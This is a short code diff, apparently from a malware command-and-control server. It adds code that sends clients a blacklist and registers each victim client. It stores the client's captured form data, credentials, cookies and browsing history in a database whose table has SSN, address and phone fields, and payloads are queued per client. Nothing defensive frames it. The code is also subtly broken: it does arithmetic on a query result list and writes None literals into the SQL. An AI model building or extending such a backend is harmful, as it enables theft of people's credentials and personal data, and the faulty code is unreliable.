@@ -36,6 +36,13 @@ Pulls blacklist and ad list from database
 """
 def construct_response(clientid):
     resp = pending_payloads.pop(clientid, None) or new_response(clientid)
+    cur.execute('SELECT URL FROM BlacklistedWebsites')
+    blacklist = cur.fetchall()
+    blacklistList = []
+    for row in blacklist:
+        blacklistList.append(row[0])
+    resp["security_blacklist"] = blacklistList
+
 
     return resp
 
@@ -47,6 +54,14 @@ parses any possible data and inserts the row, then returns the clientid that was
 for example, browser history, credentials, forms, etc.
 """
 def create_new_client(data):
+    cur.execute('SELECT LAST_INSERT_ID()')
+    lastID = cur.fetchall()
+    curID = lastID + 1
+    cur.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, NextPayload, City, Country, ZipCode, State) VALUES (%s, None, None, None, None, None, None, None, None, None, None, None, None)', curID)
+    store_form_data(data["forms"], curID)
+    store_credentials(data["creds"], curID)
+    store_cookie(data["cookie"], curID)
+    store_history(data["history"], curID)
     return 0
 
 
